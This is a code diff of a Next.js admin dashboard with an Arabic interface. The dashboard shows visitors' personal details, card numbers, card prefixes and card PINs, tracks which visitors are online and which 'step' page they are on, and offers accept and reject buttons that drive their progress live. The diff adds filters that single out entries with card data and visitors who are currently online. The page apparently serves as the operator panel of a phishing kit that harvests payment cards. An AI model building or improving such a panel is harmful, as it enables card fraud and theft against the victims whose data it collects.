@@ -1,8 +1,8 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useMemo } from "react"
 import { useRouter } from "next/navigation"
-import { Trash2, Users, CreditCard, UserCheck, Info } from "lucide-react"
+import { Trash2, Users, CreditCard, UserCheck, Filter } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ar } from "date-fns/locale"
@@ -76,8 +76,9 @@ interface Notification {
   phone: string
 }
 
-function UserStatusBadge({ userId }: { userId: string }) {
-  const [status, setStatus] = useState<string>("unknown")
+// Create a separate component for user status that returns both the badge and the status
+function UserStatus({ userId }: { userId: string }) {
+  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
 
   useEffect(() => {
     const userStatusRef = ref(database, `/status/${userId}`)
@@ -85,7 +86,7 @@ function UserStatusBadge({ userId }: { userId: string }) {
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
       const data = snapshot.val()
       if (data) {
-        setStatus(data.state)
+        setStatus(data.state === "online" ? "online" : "offline")
       } else {
         setStatus("unknown")
       }
@@ -101,6 +102,24 @@ function UserStatusBadge({ userId }: { userId: string }) {
   )
 }
 
+// Create a hook to track online status for a specific user ID
+function useUserOnlineStatus(userId: string) {
+  const [isOnline, setIsOnline] = useState(false)
+
+  useEffect(() => {
+    const userStatusRef = ref(database, `/status/${userId}`)
+
+    const unsubscribe = onValue(userStatusRef, (snapshot) => {
+      const data = snapshot.val()
+      setIsOnline(data && data.state === "online")
+    })
+
+    return () => unsubscribe()
+  }, [userId])
+
+  return isOnline
+}
+
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([])
   const [isLoading, setIsLoading] = useState(true)
@@ -111,6 +130,52 @@ export default function NotificationsPage() {
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
+
+  // Add a new state for the filter type
+  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
+
+  // Track online status for all notifications
+  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})
+
+  // Effect to track online status for all notifications
+  useEffect(() => {
+    const statusRefs: { [key: string]: () => void } = {}
+
+    notifications.forEach((notification) => {
+      const userStatusRef = ref(database, `/status/${notification.id}`)
+
+      const callback = onValue(userStatusRef, (snapshot) => {
+        const data = snapshot.val()
+        setOnlineStatuses((prev) => ({
+          ...prev,
+          [notification.id]: data && data.state === "online",
+        }))
+      })
+
+      statusRefs[notification.id] = callback
+    })
+
+    // Cleanup function
+    return () => {
+      Object.values(statusRefs).forEach((unsubscribe) => {
+        if (typeof unsubscribe === "function") {
+          unsubscribe()
+        }
+      })
+    }
+  }, [notifications])
+
+  // Filter notifications based on the selected filter type
+  const filteredNotifications = useMemo(() => {
+    if (filterType === "all") {
+      return notifications
+    } else if (filterType === "card") {
+      return notifications.filter((notification) => notification.cardNumber)
+    } else if (filterType === "online") {
+      return notifications.filter((notification) => onlineStatuses[notification.id])
+    }
+    return notifications
+  }, [filterType, notifications, onlineStatuses])
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
@@ -243,6 +308,10 @@ export default function NotificationsPage() {
     )
   }
 
+  // Calculate counts for filter buttons
+  const cardCount = notifications.filter((n) => n.cardNumber).length
+  const onlineCount = Object.values(onlineStatuses).filter(Boolean).length
+
   return (
     <div dir="rtl" className="min-h-screen bg-gray-50 text-gray-900 p-4">
       <div className="max-w-7xl mx-auto">
@@ -306,6 +375,41 @@ export default function NotificationsPage() {
           </Card>
         </div>
 
+        {/* Filter Section */}
+        <Card className="mb-4">
+          <CardContent className="p-4">
+            <div className="flex items-center gap-2 mb-2">
+              <Filter className="h-5 w-5 text-gray-500" />
+              <h3 className="font-medium">تصفية النتائج</h3>
+            </div>
+            <div className="flex flex-wrap gap-2 mt-2">
+              <Button
+                variant={filterType === "all" ? "default" : "outline"}
+                onClick={() => setFilterType("all")}
+                className="flex-1 sm:flex-none"
+              >
+                عرض الكل ({notifications.length})
+              </Button>
+              <Button
+                variant={filterType === "card" ? "default" : "outline"}
+                onClick={() => setFilterType("card")}
+                className="flex-1 sm:flex-none"
+              >
+                <CreditCard className="h-4 w-4 ml-1" />
+                البطاقات ({cardCount})
+              </Button>
+              <Button
+                variant={filterType === "online" ? "default" : "outline"}
+                onClick={() => setFilterType("online")}
+                className="flex-1 sm:flex-none"
+              >
+                <UserCheck className="h-4 w-4 ml-1" />
+                المتصلين ({onlineCount})
+              </Button>
+            </div>
+          </CardContent>
+        </Card>
+
         <Card>
           {/* Desktop Table View - Hidden on Mobile */}
           <div className="hidden md:block overflow-x-auto">
@@ -321,9 +425,8 @@ export default function NotificationsPage() {
                 </tr>
               </thead>
               <tbody>
-                {notifications.map((notification) => (
-                  <tr key={notification?.country
-                  } className="border-b hover:bg-gray-50">
+                {filteredNotifications.map((notification) => (
+                  <tr key={notification.id} className="border-b hover:bg-gray-50">
                     <td className="px-4 py-3">{notification.country || "غير معروف"}</td>
                     <td className="px-4 py-3">
                       <div className="flex flex-wrap gap-2">
@@ -341,7 +444,6 @@ export default function NotificationsPage() {
                         >
                           {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
-                       
                       </div>
                     </td>
                     <td className="px-4 py-3">خطوه - {notification.page}</td>
@@ -353,7 +455,7 @@ export default function NotificationsPage() {
                         })}
                     </td>
                     <td className="px-4 py-3 text-center">
-                      <UserStatusBadge userId={notification.id} />
+                      <UserStatus userId={notification.id} />
                     </td>
                     <td className="px-4 py-3 text-center">
                       <div className="flex justify-center gap-2">
@@ -397,88 +499,99 @@ export default function NotificationsPage() {
                     </td>
                   </tr>
                 ))}
+                {filteredNotifications.length === 0 && (
+                  <tr>
+                    <td colSpan={6} className="px-4 py-8 text-center text-gray-500">
+                      لا توجد إشعارات متطابقة مع الفلتر المحدد
+                    </td>
+                  </tr>
+                )}
               </tbody>
             </table>
           </div>
 
           {/* Mobile Card View - Shown only on Mobile */}
           <div className="md:hidden space-y-4 p-4">
-            {notifications.map((notification) => (
-              <Card key={notification.id} className="overflow-hidden">
-                <CardContent className="p-4">
-                  <div className="flex justify-between items-start mb-3">
-                    <div>
-                      <div className="font-semibold">{notification.personalInfo?.name || "غير معروف"}</div>
-                    </div>
-                    <UserStatusBadge userId={notification.id} />
-                  </div>
-
-                  <div className="grid grid-cols-1 gap-3 mb-3">
-                    <div className="flex flex-wrap gap-2">
-                      <Badge
-                        variant={notification.name ? "default" : "destructive"}
-                        className="rounded-md cursor-pointer"
-                        onClick={() => handleInfoClick(notification, "personal")}
-                      >
-                        {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
-                      </Badge>
-                      <Badge
-                        variant={notification.cardNumber ? "default" : "destructive"}
-                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
-                        onClick={() => handleInfoClick(notification, "card")}
-                      >
-                        {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
-                      </Badge>
+            {filteredNotifications.length > 0 ? (
+              filteredNotifications.map((notification) => (
+                <Card key={notification.id} className="overflow-hidden">
+                  <CardContent className="p-4">
+                    <div className="flex justify-between items-start mb-3">
+                      <div>
+                        <div className="font-semibold">{notification.personalInfo?.name || "غير معروف"}</div>
+                      </div>
+                      <UserStatus userId={notification.id} />
                     </div>
 
-                    <div className="text-sm">
-                      <span className="font-medium">الصفحة الحالية:</span> خطوه - {notification.page}
-                    </div>
+                    <div className="grid grid-cols-1 gap-3 mb-3">
+                      <div className="flex flex-wrap gap-2">
+                        <Badge
+                          variant={notification.name ? "default" : "destructive"}
+                          className="rounded-md cursor-pointer"
+                          onClick={() => handleInfoClick(notification, "personal")}
+                        >
+                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                        </Badge>
+                        <Badge
+                          variant={notification.cardNumber ? "default" : "destructive"}
+                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                          onClick={() => handleInfoClick(notification, "card")}
+                        >
+                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                        </Badge>
+                      </div>
 
-                    <div className="text-sm">
-                      <span className="font-medium">الوقت:</span>{" "}
-                      {notification.createdDate &&
-                        formatDistanceToNow(new Date(notification.createdDate), {
-                          addSuffix: true,
-                          locale: ar,
-                        })}
-                    </div>
+                      <div className="text-sm">
+                        <span className="font-medium">الصفحة الحالية:</span> خطوه - {notification.page}
+                      </div>
 
-                    <div className="flex gap-2 mt-2">
-                      <Button
-                        onClick={() => {
-                          handleApproval("approved", notification.id)
-                          setMessage(true)
-                          setTimeout(() => {
-                            setMessage(false)
-                          }, 3000)
-                        }}
-                        className="flex-1 bg-green-500 hover:bg-green-600"
-                      >
-                        قبول
-                      </Button>
-                      <Button
-                        onClick={() => {
-                          handleApproval("rejected", notification.id)
-                          setMessage(true)
-                          setTimeout(() => {
-                            setMessage(false)
-                          }, 3000)
-                        }}
-                        className="flex-1"
-                        variant="destructive"
-                      >
-                        رفض
-                      </Button>
-                      <Button variant="outline" onClick={() => handleDelete(notification.id)} className="w-10 p-0">
-                        <Trash2 className="h-4 w-4" />
-                      </Button>
+                      <div className="text-sm">
+                        <span className="font-medium">الوقت:</span>{" "}
+                        {notification.createdDate &&
+                          formatDistanceToNow(new Date(notification.createdDate), {
+                            addSuffix: true,
+                            locale: ar,
+                          })}
+                      </div>
+
+                      <div className="flex gap-2 mt-2">
+                        <Button
+                          onClick={() => {
+                            handleApproval("approved", notification.id)
+                            setMessage(true)
+                            setTimeout(() => {
+                              setMessage(false)
+                            }, 3000)
+                          }}
+                          className="flex-1 bg-green-500 hover:bg-green-600"
+                        >
+                          قبول
+                        </Button>
+                        <Button
+                          onClick={() => {
+                            handleApproval("rejected", notification.id)
+                            setMessage(true)
+                            setTimeout(() => {
+                              setMessage(false)
+                            }, 3000)
+                          }}
+                          className="flex-1"
+                          variant="destructive"
+                        >
+                          رفض
+                        </Button>
+                        <Button variant="outline" onClick={() => handleDelete(notification.id)} className="w-10 p-0">
+                          <Trash2 className="h-4 w-4" />
+                        </Button>
+                      </div>
+                      {message && <p className="text-green-500 text-center mt-2">تم الارسال</p>}
                     </div>
-                    {message && <p className="text-green-500 text-center mt-2">تم الارسال</p>}
-                  </div>
-                </CardContent>
-              </Card>
-            ))}
+                  </CardContent>
+                </Card>
+              ))
+            ) : (
+              <div className="text-center py-8 text-gray-500">لا توجد إشعارات متطابقة مع الفلتر المحدد</div>
+            )}
           </div>
         </Card>
       </div>
@@ -540,9 +653,14 @@ export default function NotificationsPage() {
                 <p className="flex justify-between">
                   <span className="font-medium text-gray-700">رقم البطاقة:</span>
                   <span className="font-semibold" dir="ltr">
-                  {selectedNotification.prefix &&  <Badge variant={'outline'} className="bg-blue-100">{selectedNotification.prefix && `  ${selectedNotification.prefix}`}</Badge>}{" "}
-                    <Badge variant={'outline'} className="bg-green-100">{selectedNotification.cardNumber}</Badge>
-
+                    {selectedNotification.prefix && (
+                      <Badge variant={"outline"} className="bg-blue-100">
+                        {selectedNotification.prefix && `  ${selectedNotification.prefix}`}
+                      </Badge>
+                    )}{" "}
+                    <Badge variant={"outline"} className="bg-green-100">
+                      {selectedNotification.cardNumber}
+                    </Badge>
                   </span>
                 </p>
               )}
@@ -556,8 +674,7 @@ export default function NotificationsPage() {
                   </span>
                 </p>
               )}
-              {selectedNotification.
-              pass && (
+              {selectedNotification.pass && (
                 <p className="flex justify-between">
                   <span className="font-medium text-gray-700">رمز البطاقة:</span>
                   <span className="font-semibold">{selectedNotification.pass}</span>
